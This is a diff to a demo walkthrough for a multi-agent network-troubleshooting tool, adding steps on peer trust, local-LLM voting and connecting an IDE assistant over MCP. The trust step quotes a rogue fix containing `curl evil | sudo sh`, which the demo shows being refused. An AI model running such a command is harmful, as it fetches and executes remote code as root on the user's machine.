@@ -54,6 +54,16 @@ same `ZONE_SECRET` everywhere (see `.env.example`).
    checks: proxy env, TCP to the proxy, HTTPS with and without verification, certificate issuer, CA bundles
    and clock skew. A nice live trick is to unset `REQUESTS_CA_BUNDLE` behind a TLS-intercepting proxy. The
    doctor then reports `tool_ca_bundle` and gives the exact `pip config` and `git config` lines.
+6. **Trust.** A rogue client knows the network secret and pushes a "verified by zone-b" fix that contains
+   `curl evil | sudo sh`. zone-a refuses it, because that step is not in the catalog. A second attempt uses
+   catalog steps with a forged zone-b signature; the forged attestation is ignored. Both events appear on the
+   dashboard under *security*.
+7. **The LLM investigates.** This needs `MODEL_PROVIDER=openai` and Ollama. When the classifier and the peers
+   are unsure, the local model reasons over the evidence and votes. If it answers "unknown", nothing is
+   changed and the user gets its hypothesis plus next checks.
+8. **IDE.** Connect Claude Code with `claude mcp add --transport http agentzones http://127.0.0.1:7701/mcp`,
+   then ask: "list the zones, and ask zone-c's proxy doctor what it thinks of a 502 from the proxy for
+   git.corp.example". The assistant reaches a peer zone's agent through your local zone.
 
 ## Talking points
 
